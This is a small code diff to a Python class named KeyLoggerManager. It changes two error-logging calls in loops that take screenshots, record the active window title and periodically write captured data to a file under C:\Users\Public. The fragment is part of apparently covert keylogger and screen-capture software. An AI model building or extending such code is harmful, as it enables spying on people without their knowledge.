@@ -30,7 +30,7 @@ class KeyLoggerManager:
             try:
                 self.__instance._take_shot()
             except Exception as e:
-                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__db, ('error in:',pygetwindow.getActiveWindowTitle(),'exception:',e))
+                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__data, ('error in:',pygetwindow.getActiveWindowTitle(),'exception:',e))
             time.sleep(0.5)
 
     def __write_file(self):
@@ -39,7 +39,7 @@ class KeyLoggerManager:
             try:
                 self.write_file()
             except Exception as e:
-                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__db, e)
+                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__data, e)
             time.sleep(2)
         self.write_file()
         # os.remove(r"C:\Users\Public\tmp.json")
